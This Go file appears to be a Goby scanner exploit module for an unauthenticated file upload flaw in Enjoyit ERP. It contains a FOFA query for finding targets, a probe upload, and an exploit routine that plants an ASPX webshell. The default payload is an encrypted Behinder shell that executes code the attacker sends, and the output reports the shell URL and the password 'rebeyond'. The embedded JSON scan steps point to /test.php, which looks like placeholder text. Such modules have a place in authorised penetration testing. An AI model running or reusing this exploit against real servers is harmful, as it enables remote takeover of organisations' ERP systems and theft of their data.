package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "enjoyit ERP /File/UploadFile file upload",
    "Description": "<p>\"Enjoyit ERP\" is Enterprise Resource Planning (ERP) software, an integrated management software system designed to help organizations manage various departments and business processes, including finance, human resources, supply chain management, production planning, sales, and customer relations. computer privileges</p>",
    "Product": "enjoyit ERP",
    "Homepage": "https://www.enjoyit.com.cn/channels/products.html",
    "DisclosureDate": "2023-03-21",
    "PostTime": "2024-03-14",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"enableGPUAcceleration\" && body=\"/Scripts/Silverlight.js\"",
    "GobyQuery": "body=\"enableGPUAcceleration\" && body=\"/Scripts/Silverlight.js\"",
    "Level": "3",
    "Impact": "<p>An attacker can rely on this vulnerability to remotely gain access to a computer</p>",
    "Recommendation": "<p>1. install waf to block harmful packages from the application layer</p><p>2. fix the code to eliminate the file upload vulnerability</p><p>3. install antivirus software and regularly clean your computer from Trojans.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,custom",
            "show": ""
        },
        {
            "name": "shellName",
            "type": "input",
            "value": "polite.aspx",
            "show": "attackType=custom"
        },
        {
            "name": "shellContent",
            "type": "input",
            "value": "<%@ Page Language=\"C#\" %><%@Import Namespace=\"System.Reflection\"%><%Session.Add(\"k\",\"e45e329feb5d925b\"); byte[] k = Encoding.Default.GetBytes(Session[0] + \"\"),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"U\").Equals(this);%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.4",
    "Translation": {
        "CN": {
            "Name": "昂捷ERP /File/UploadFile 文件上传漏洞",
            "Product": "昂捷ERP",
            "Description": "<p>\"Enjoyit ERP\" 是一款企业资源规划（Enterprise Resource Planning，ERP）软件。ERP 是一种集成管理软件系统，旨在帮助企业管理各个部门和业务流程，包括财务、人力资源、供应链管理、生产计划、销售和客户关系等，攻击者可依靠该漏洞远程取得计算机权限<br></p>",
            "Recommendation": "<p>1. 安装waf，从应用层拦截有危害的包</p><p>2. 修复代码，消除该文件上传漏洞</p><p>3. 安装杀毒软件，定期对计算机进行木马清理</p>",
            "Impact": "<p>攻击者可依靠该漏洞远程取得计算机权限<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "enjoyit ERP /File/UploadFile file upload",
            "Product": "enjoyit ERP",
            "Description": "<p>\"Enjoyit ERP\" is Enterprise Resource Planning (ERP) software, an integrated management software system designed to help organizations manage various departments and business processes, including finance, human resources, supply chain management, production planning, sales, and customer relations. computer privileges<br></p>",
            "Recommendation": "<p>1. install waf to block harmful packages from the application layer</p><p>2. fix the code to eliminate the file upload vulnerability</p><p>3. install antivirus software and regularly clean your computer from Trojans.</p>",
            "Impact": "<p>An attacker can rely on this vulnerability to remotely gain access to a computer<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10934"
}`
	uploadFilepolite007 := func(hostInfo *httpclient.FixUrl, filename string, content string) (*httpclient.HttpResponse, error) {
		uploadRequestConfig := httpclient.NewPostRequestConfig("/File/UploadFile?fileinfo={\"FileName\":\"" + filename + "\",\"LastChunk\":1}")
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36")
		uploadRequestConfig.Header.Store("Accept", "*/*")
		uploadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		//uploadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV")
		uploadRequestConfig.Data = content
		//uploadRequestConfig.Data = "------WebKitFormBoundaryt1qdEWTI01cj5BLV\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"" + filename + "\"\r\nContent-Type: image/jpeg\r\n\r\n" + content + "\r\n------WebKitFormBoundaryt1qdEWTI01cj5BLV\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nupload\r\n------WebKitFormBoundaryt1qdEWTI01cj5BLV--\r\n"
		if resp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig); resp != nil && resp.StatusCode == 200 {
			getFileConfig := httpclient.NewGetRequestConfig("/TempFile/" + filename)
			getFileConfig.VerifyTls = false
			getFileConfig.FollowRedirect = false
			return httpclient.DoHttpRequest(hostInfo, getFileConfig)
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(5) + ".aspx"
			resp, _ := uploadFilepolite007(hostInfo, filename, "<%@ Page Language=\"C#\"%><%@ Import Namespace=\"System.IO\"%><% Response.Write(\"checkString\");File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>")
			return resp != nil && strings.Contains(resp.Utf8Html, "checkString")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attacktype := goutils.B2S(ss.Params["attackType"])
			filename := goutils.B2S(ss.Params["shellName"])
			content := goutils.B2S(ss.Params["shellContent"])
			if resp, err := uploadFilepolite007(expResult.HostInfo, filename, content); resp.StatusCode == 200 || resp.StatusCode == 500 {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if attacktype == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
					expResult.Output += "Webshell type: aspx"
				}
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
